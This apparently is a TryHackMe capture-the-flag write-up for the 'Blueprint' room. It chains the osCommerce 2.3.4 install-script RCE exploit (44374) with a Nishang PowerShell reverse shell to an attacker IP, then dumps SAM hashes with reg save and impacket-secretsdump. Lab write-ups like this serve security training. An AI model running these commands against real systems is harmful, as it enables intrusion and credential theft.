Blueprint

TryHackMe · Easy by Brenno M.

Blueprint exploits an RCE in osCommerce 2.3.4 (exposed install script) to obtain command execution as SYSTEM on a Windows/XAMPP host, then extracts local hashes with secretsdump.

Reconnaissance

Nmap reveals IIS, Apache/PHP (8080), SMB and MySQL. Port 8080 runs osCommerce 2.3.4, with public exploit 44374.

nmap -sS -sV -Pn <IP>
searchsploit osCommerce 2.3.4
searchsploit -m 44374

Exploitation

The exploit injects code into install.php and allows commands via a parameter. Host a PowerShell reverse shell (Nishang) and get a shell, on XAMPP, already privileged.

python3 44374.py   # (base_url and target_url configured)
# Invoke-PowerShellTcp -Reverse -IPAddress <MY_IP> -Port 4444

Post-exploitation - secretsdump

Save the SAM and SYSTEM registry hives, download them and extract the NTLM hashes locally with Impacket secretsdump (the hash can then be cracked offline).

reg save hklm\sam sam.bak
reg save hklm\system system.bak
# download sam.bak / system.bak
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
# Administrator NTLM hash: <HASH_OMITTED>  (crack offline)
